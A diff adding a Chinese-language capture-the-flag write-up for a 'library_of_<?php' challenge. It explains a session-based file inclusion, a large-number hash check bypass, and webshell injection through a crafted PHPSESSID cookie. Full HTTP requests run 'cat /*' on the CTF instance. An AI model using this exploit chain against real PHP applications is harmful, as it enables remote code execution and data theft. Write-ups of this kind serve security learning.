@@ -290,6 +290,60 @@ jwt = login("admin", pwd)["jwt"]
 
 print(grab_flag(jwt))
 ```
+
+### library_of_\<?php
+
+一处文件包含,会包含session的键值对
+```php
+        if (hash('sha256', $d + rand(0, getrandmax())) === $securify) {
+            include getBookPath($_GET['s']);
+        }
+```
+使用大数绕过
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240416003244.png)
+
+```php
+        echo substr($results, 0, $t) . '<b>' . htmlspecialchars($this->search, ENT_QUOTES, 'UTF-8') . '</b>' . substr($results, $t);
+```
+index.php会post一个参数q,然后将q的内容html实体编码并左右添加随机生成的字符串,
+,也就是我们输入的内容会写入一个文件,且我们可以文件包含
+
+还需要解决一个问题,那就是写入的字符串不能有<,该怎么让php解析
+我们发现当username为空,会从session的后六位取,当键名不合法会输出报错信息
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240416005508.png)
+利用这个可以写入webshell,通过/* 注释
+
+\<?php/* 太长,只截取6位
+\<?=%0A/* 会报错
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240416010415.png)
+
+不知道为什么只有\<?1可以
+
+
+---
+```http
+POST /index.php HTTP/1.1
+Host: libraryofphp-e021c5272a541b25.instancer.b01lersc.tf
+Content-Length: 27
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=a%00aaaaaaaaaaaaaa<?1/*; username=
+Connection: close
+
+q=*/; echo `cat /*`; //aaax
+```
+
+
+
+```http
+GET /search.php/?s=0v-0000h-08481&securify=870067877a36e908674b7ca41d36ffcc9ed8636f13acbf51f3b195f4e06380ad&d=-103210321111111111110321032111111111111032103211111111111 HTTP/1.1
+Host: libraryofphp-e021c5272a541b25.instancer.b01lersc.tf
+Cookie: username=; PHPSESSID=a%00aaaaaaaaaaaaaa<?1/*
+Connection: close
+```
+
+
+
+
 # reverse
 
 # pwn
